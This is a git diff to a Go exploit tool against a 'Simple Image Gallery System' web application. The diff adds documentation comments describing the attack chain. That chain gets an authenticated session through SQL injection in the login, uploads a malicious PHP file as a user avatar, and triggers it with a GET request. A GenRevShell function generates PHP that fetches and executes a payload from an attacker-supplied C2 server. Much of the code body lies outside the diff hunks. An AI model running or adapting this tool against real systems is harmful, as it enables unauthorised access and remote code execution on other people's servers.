@@ -92,6 +92,29 @@ func SysMsgNB(msg string) {
 // Functions: Session Management
 //============================================================
 
+//============================================================
+//
+// Function Name: ConfirmAccess
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to reach out to the gallery
+//    route and confirm that the user has gained an
+//    authenticated session by searching for a piece of HTML
+//    only present on authenticated areas of the site.
+//
+// Input(s):
+//
+//    None.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) ConfirmAccess() (success bool, message string) {
 	const route string = "gallery/"
 	var targetPattern string = "Welcome to Simple Image Gallery System"
@@ -126,6 +149,29 @@ func (c *Client) ConfirmAccess() (success bool, message string) {
 	return true, "login confirmed"
 }
 
+//============================================================
+//
+// Function Name: CreateMIMEData
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to build the MIME parts
+//    necessary for updating user information.
+//
+// Input(s):
+//
+//    userinfo - UserInformation. struct containting updated info.
+//    filename - string. name of file to upload to server.
+//    filewriter - *multipartWriter. MIME writer.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) CreateMIMEData(userinfo UserInformation, filename string, filewriter *multipart.Writer) (success bool, message string) {
 	defer filewriter.Close()
 
@@ -208,6 +254,29 @@ func (c *Client) CreateMIMEData(userinfo UserInformation, filename string, filew
 	return true, "MIME data created"
 }
 
+//============================================================
+//
+// Function Name: TriggerShell
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to reach out to the gallery
+//    index page and acquire the full URL of the uploaded
+//    foothold file.
+//
+// Input(s):
+//
+//    tgtFile - string. malicious file uploaded as avatar.
+//
+// Return(s):
+//
+//    avatarURL - string. URL scraped from site.
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) GetAvatar(tgtFile string) (avatarURL string, success bool, message string) {
 	var target string = fmt.Sprintf("%s/gallery/index.php", c.baseURL)
 	var avatarpattern string = fmt.Sprintf("<.*src=.*%s\"", tgtFile)
@@ -243,6 +312,30 @@ func (c *Client) GetAvatar(tgtFile string) (avatarURL string, success bool, mess
 	return avatarURL, true, "avatar filename pulled successfully"
 }
 
+//============================================================
+//
+// Function Name: GetCookies
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to reach out to the login
+//    page and acquire a session cookie to be used when
+//    performing various requests. This is required for the
+//    login process to be persistant. The acquired cookies
+//    are saved in the client's cookie jar.
+//
+// Input(s):
+//
+//    None.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) GetCookies() (success bool, message string) {
 	const route string = "gallery/login.php"
 	var target string = fmt.Sprintf("%s/%s", c.baseURL, route)
@@ -266,6 +359,28 @@ func (c *Client) GetCookies() (success bool, message string) {
 	return true, "cookie retrieved"
 }
 
+//============================================================
+//
+// Function Name: Login
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to send a login request to
+//    the site. It attempts to gain a user session by
+//    performing a SQLi attack against the login process.
+//
+// Input(s):
+//
+//    username - string. user to attempt login as.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) Login(username string) (success bool, message string) {
 	var bodyData url.Values = url.Values{}
 	var content []byte
@@ -325,6 +440,29 @@ func (c *Client) Login(username string) (success bool, message string) {
 	return success, message
 }
 
+//============================================================
+//
+// Function Name: PullUserInfo
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to pull down the user info
+//    from the site. This information is embedded in the user
+//    account page.
+//
+// Input(s):
+//
+//    None.
+//
+// Return(s):
+//
+//    info - UserInformation. struct containing user info.
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) PullUserInfo() (info UserInformation, success bool, message string) {
 	const patternId string = "<input.*name=\"id\".*value=.*>"
 	const patternFirstname string = "<input.*name=\"firstname\".*value=.*>"
@@ -392,6 +530,29 @@ func (c *Client) PullUserInfo() (info UserInformation, success bool, message str
 	return info, true, "user information successfully scraped"
 }
 
+//============================================================
+//
+// Function Name: TriggerShell
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to reach out to the  uploaded
+//    PHP file and send an HTTP GET request to it, triggering
+//    the exploit. This is required for automatic
+//    exploitation to be succesful.
+//
+// Input(s):
+//
+//    avatarURL - string. URL of the uploaded PHP file.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) TriggerShell(avatarURL string) (success bool, message string) {
 	resp, err := c.Session.Get(avatarURL)
 	if err != nil {
@@ -411,6 +572,29 @@ func (c *Client) TriggerShell(avatarURL string) (success bool, message string) {
 	return true, "shell triggered"
 }
 
+//============================================================
+//
+// Function Name: UpdateInfo
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to reach out to the endpoint
+//    that updates a user's information and upload a file that
+//    will allow an attacker a foothold on the target.
+//
+// Input(s):
+//
+//    userInfo - UserInformation. struct containting user info.
+//    revshell - string. name of file used to gain foothold.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func (c *Client) UpdateInfo(userInfo UserInformation, revshell string) (success bool, message string) {
 	var contentBuf *bytes.Buffer = new(bytes.Buffer)
 	var filewriter multipart.Writer = *multipart.NewWriter(contentBuf)
@@ -439,6 +623,30 @@ func (c *Client) UpdateInfo(userInfo UserInformation, revshell string) (success 
 // Functions: Reverse Shell
 //============================================================
 
+//============================================================
+//
+// Function Name: GenRevShell
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to create and save a PHP
+//    script that will reach back to a C2 server and pull
+//    down and execute a malicious payload on the target.
+//
+// Input(s):
+//
+//    c2ip - string. IP address (or domain) of C2 server.
+//    c2port - int. port C2 server is running on.
+//    tgtFile - string. file to pull down from C2 server.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func GenRevShell(c2ip string, c2port int, tgtFile string) (success bool, message string) {
 	var c2addr string = fmt.Sprintf("%s:%d", c2ip, c2port)
 
@@ -467,6 +675,27 @@ func GenRevShell(c2ip string, c2port int, tgtFile string) (success bool, message
 // Functions: General
 //============================================================
 
+//============================================================
+//
+// Function Name: ValidatePort
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to determine whether a given
+//    port number is valid.
+//
+// Input(s):
+//
+//    portno - int. port number to test validity of.
+//
+// Return(s):
+//
+//    success - bool. indication of validity.
+//    message - string. status message.
+//
+//============================================================
 func ValidatePort(portno int) (success bool, message string) {
 	if (portno < 1) || (portno > 65535) {
 		return false, "port must be between 1 and 65535"
@@ -487,6 +716,10 @@ func main() {
 	var client Client = Client{Session: &http.Client{Timeout: 30 * time.Second}}
 	var clientjar *cookiejar.Jar
 
+	//------------------------------------------------------------
+	// Setup Command-Line Arguments
+	//------------------------------------------------------------
+
 	flag.StringVar(&domain, "t", "127.0.0.1", "domain or ip address of target")
 	flag.IntVar(&port, "p", 80, "port to communicate with target on")
 	flag.StringVar(&c2ip, "ci", "127.0.0.1", "C2 domain or ip address")
@@ -494,17 +727,29 @@ func main() {
 	flag.StringVar(&malfile, "f", "revshell", "file to drop onto target")
 	flag.Parse()
 
+	//------------------------------------------------------------
+	// Validate Target Port
+	//------------------------------------------------------------
+
 	success, message := ValidatePort(port)
 	if !success {
 		ErrMsg(fmt.Sprintf("Target Port: %s", message))
 		os.Exit(1)
 	}
 
+	//------------------------------------------------------------
+	// Validate C2 Port
+	//------------------------------------------------------------
+
 	success, message = ValidatePort(c2port)
 	if !success {
 		ErrMsg(fmt.Sprintf("C2 Server Port: %s", message))
 		os.Exit(1)
 	}
+
+	//------------------------------------------------------------
+	// Display Import Argument Info To User
+	//------------------------------------------------------------
 
 	InfMsg(fmt.Sprintf("C2 Address: %s", c2ip))
 	InfMsg(fmt.Sprintf("C2 Server Port: %d", c2port))
@@ -521,6 +766,10 @@ func main() {
 	}
 	client.Session.Jar = clientjar
 
+	//------------------------------------------------------------
+	// Generate RevShell And Get Authenticated Session
+	//------------------------------------------------------------
+
 	success, message = GenRevShell(c2ip, c2port, malfile)
 	if !success {
 		ErrMsg(message)
@@ -534,6 +783,10 @@ func main() {
 		os.Exit(1)
 	}
 	SucMsg(message)
+
+	//------------------------------------------------------------
+	// Upload File And Gain Foothold On Target
+	//------------------------------------------------------------
 
 	userInformation, success, message := client.PullUserInfo()
 	if !success {
@@ -562,6 +815,8 @@ func main() {
 		os.Exit(1)
 	}
 	SucMsg(message)
+
+	//------------------------------------------------------------
 
 	return
 }
